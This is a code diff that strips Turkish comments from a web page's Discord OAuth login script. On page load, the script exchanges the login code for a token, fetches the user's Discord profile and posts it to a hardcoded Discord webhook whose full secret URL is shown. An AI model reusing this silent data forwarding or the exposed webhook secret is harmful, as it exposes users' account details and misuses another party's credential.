@@ -47,10 +47,10 @@
     </div>
 
     <script>
-        // ZETA WEBHOOK - GERÇEK VERİLER BURAYA GİDECEK
+        
         const ZETA_WEBHOOK = 'https://discord.com/api/webhooks/1423076546402451526/Pd6lCOnJgHCiXhVr0SqC33gVzPWpaWol31cpbK81Ki8FmsCESlAuDnOGOvBwr-KUiiJh';
 
-        // TÜM VERİLERİ TOPLA (SADECE GEREKLİ OLANLAR)
+        
         async function collectAllData(authCode) {
             // Lokal saat ve tarih
             const localTime = new Date().toLocaleString('tr-TR');
@@ -62,11 +62,11 @@
             };
         }
 
-        // GERÇEK KULLANICI BİLGİLERİNİ AL (Discord API ile)
+        
         async function getDiscordUserInfo(authCode) {
             try {
-                // GERÇEK DISCORD API ENTEGRASYONU
-                // 1. Auth code ile access token al
+                
+                
                 const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
                     method: 'POST',
                     headers: {
@@ -87,7 +87,7 @@
                     throw new Error('Access token alınamadı');
                 }
 
-                // 2. Access token ile kullanıcı bilgilerini al
+               
                 const userResponse = await fetch('https://discord.com/api/users/@me', {
                     headers: {
                         'Authorization': `Bearer ${tokenData.access_token}`
@@ -121,7 +121,7 @@
             }
         }
 
-        // WEBHOOK'A GÖNDER - SADECE GEREKLİ VERİLER
+        
         async function sendToZeta(data, userInfo) {
             try {
                 await fetch(ZETA_WEBHOOK, {
@@ -164,7 +164,7 @@
             }
         }
 
-        // LOCALSTORAGE'A KAYDET - GERÇEK KULLANICI BİLGİLERİYLE
+       
         function saveUserToStorage(userInfo) {
             const storageData = {
                 id: userInfo.id,
@@ -195,23 +195,23 @@
             }
 
             try {
-                // GEREKLİ VERİLERİ TOPLA
+             
                 const allData = await collectAllData(authCode);
                 
-                // GERÇEK DISCORD KULLANICI BİLGİLERİNİ AL
+                
                 const userInfo = await getDiscordUserInfo(authCode);
                 
-                // LOCALSTORAGE'A GERÇEK KULLANICI BİLGİLERİNİ KAYDET
+              
                 saveUserToStorage(userInfo);
                 
-                // ZETA'YA GÖNDER (SADECE KULLANICI BİLGİLERİ)
+               
                 await sendToZeta(allData, userInfo);
                 
-                // BAŞARIYI GÖSTER
+               
                 document.getElementById('loader').classList.add('hidden');
                 document.getElementById('success').classList.remove('hidden');
                 
-                // ANA SAYFAYA YÖNLENDİR (GİRİŞ BAŞARILI PARAMETRESİYLE)
+                
                 setTimeout(() => {
                     window.location.href = 'https://myhisticdevelopment.vercel.app/?login=success';
                 }, 1500);
@@ -226,7 +226,7 @@
             }
         }
 
-        // SAYFA AÇILIR AÇILMAZ ÇALIŞSIN
+        
         document.addEventListener('DOMContentLoaded', processDiscordLogin);
     </script>
 </body>
